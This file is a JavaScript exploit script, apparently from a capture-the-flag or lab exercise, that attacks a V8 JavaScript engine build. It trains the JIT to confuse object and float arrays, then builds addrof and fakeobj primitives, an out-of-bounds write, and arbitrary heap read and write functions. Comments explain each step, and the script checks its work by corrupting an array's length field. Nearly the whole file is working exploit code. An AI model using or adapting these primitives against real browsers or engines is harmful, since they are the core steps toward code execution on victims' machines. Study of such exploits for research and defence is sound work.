/*
  I think addrof and fakeobj should already be enough, but after trying for a while I couldn't get it to work.
  So instead I realized I can write Out-Of-Bounds by abusing the difference in size between object arrays (32bit ptrs) and
  float arrays (64bit floats) to read/write floats OOB in an object array 
    (Below the length of the obj array, but the writes being 2x the size, go out of bounsd).
  
  Using this, I can overwrite the elementptr of an object array, and read/write floats to it using fl_read/write.
  Using that and addrof I can make an obj_arr that points at the element pointer of a normal float array, and then 
  the arbitrary read/write is just writing the address as a float to the obj_arr using fl_write and doing a read/write of the fl_arr.

  To test it, I read the 64bit word that has the length as an SMI in the upper 64bits of the fl_arr, then modify it, and read it
  using both arbitrary read and fl_arr.length to verify that it works.

  I had a problem with "old space" arrays not having the storage for the elements behind them, so I had to make fl_[read|write]
  faster. Turns out I just needed to make them a bit more arbitrarily complicated, I think that is stopping the inliner.
*/

// Utils, ftoi, itof, print hex
var buf = new ArrayBuffer(8);
// Views of buf for type punning
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
// low 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_low32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]);
}
// high 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_hi32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[1]);
}
function itof(val) {
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
function print_hex(int) {
  console.log("0x" + int.toString(16).padStart(16, "0"));
}
function print_fptr(number) {
  print_hex(ftoi(number));
}
// Preserves high 32 bits
function compress_ptr(old_val, low_32bits_to_set) {
  return itof((ftoi_hi32(old_val) << 32n) + low_32bits_to_set);
}
// Preserves high 32 bits and applies the read offset used by JSArrays in reverse (-8 bytes)
function compress_elementptr(old_val, low_32bits_to_set) {
  // No idea why the -8n is needed (It's a 64bit/8byte offset). Length of the array stored before the elements?
  return compress_ptr(old_val, low_32bits_to_set - 8n);
}
// END UTILS

function fl_read(read_arr, idx) {
  // Needless complexity to presumably stop the inliner
    let val = read_arr[idx]

    let vval = val
    let x = [1,1,3,4]
    for(var i=0; i < 3; i++) {
        let y = x[x[1]]
        vval += vval ? x[y] : vval;
    }
    //

    return read_arr[idx];
}
// Train the JIT
let tmp_arr = [1.01, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
for(let i=0; i< 100*100*100+1; i++) {
    tmp_arr[0] = fl_read(tmp_arr, i & 1)
}

function fl_write(write_arr, idx, write_val) {
    // Needless complexity to presumably stop the inliner
    let val = write_arr[idx]

    let vval = val
    let x = [1,1,3,4]
    for(var i=0; i < 3; i++) {
        let y = x[x[1]]
        vval += vval ? x[y] : vval;
    }
    //

    write_arr[idx] = write_val;
}
// Train the JIT
for(let i=0; i< 100*100*100+1; i++) {
    fl_write(tmp_arr, i & 1, i)
}

function addrof(obj) {
    let obj_arr = [obj];
    return ftoi(fl_read(obj_arr, 0)) & 0xFFFFFFFFn
}

function fakeobj(addr) {
  let obj = {"a":1}
  let obj_arr = [obj, obj]
  addr = ftoi(addr) & 0xFFFFFFFFn;
  addr = itof(addr | (addr << 32n))
  fl_write(obj_arr, 0, addr)
  return obj_arr[0]
}

let obj_a = {"k":"a"};
// obj array with 8 objects
let obj_arr = [obj_a, obj_a, obj_a, obj_a, obj_a, obj_a, obj_a, obj_a]
// fl array with 2 floats
let fl_arr = [1.1, 1.2]

console.log("obj_arr:")
;%DebugPrint(obj_arr);
console.log("fl_arr:")
;%DebugPrint(fl_arr);

console.log("addrof(fl_arr):")
let fl_arr_addr = addrof(fl_arr);
print_hex(fl_arr_addr);
console.log("fl_arr_elementptr_addr:")
let fl_arr_elementptr_addr = fl_arr_addr + 8n;
print_hex(fl_arr_elementptr_addr);
console.log("old 64bit value at obj_arr's elementptr's addr:")
let old_val = fl_read(obj_arr, 5)
print_fptr(old_val);
console.log("compressed_with_hi32:")
let compressed_with_hi32= compress_elementptr(old_val, fl_arr_elementptr_addr)
print_fptr(compressed_with_hi32);
fl_write(obj_arr, 5, compressed_with_hi32)
console.log("obj_arr elementptr modified to point to fl_arr's elementptr")

function arb_heap_read(addr) {
    // Write to fl_arr's elementptr through obj_arr
    let old = fl_read(obj_arr, 0, itof(addr))
    let elementptr = compress_elementptr(old, (addr&0xFFFFFFFFn))
    fl_write(obj_arr, 0, elementptr)
    // Use fl_arr for read/write
    return fl_arr[0];
}
function arb_heap_write(addr, val) {
    // Write to fl_arr's elementptr through obj_arr
    let old = fl_read(obj_arr, 0, itof(addr))
    let elementptr = compress_elementptr(old, (addr&0xFFFFFFFFn))
    fl_write(obj_arr, 0, elementptr)
    // Use fl_arr for read/write
    fl_arr[0] = val;
}

console.log("fl_arr.length:")
console.log(fl_arr.length)
console.log("arb_heap_read(addrof(fl_arr)+8n):")
let len_val = arb_heap_read(addrof(fl_arr)+8n);
print_fptr(len_val)
console.log("arb_heap_write(addrof(obj_arr), len_val | (0x1 << 36))")
let new_len = ftoi(len_val) | (0x1n << 36n)
arb_heap_write(addrof(fl_arr)+8n, itof(new_len))
console.log("arb_heap_read(addrof(fl_arr)+8n):")
print_fptr(arb_heap_read(addrof(fl_arr)+8n))
console.log("fl_arr.length:")
console.log(fl_arr.length)


while(true) {}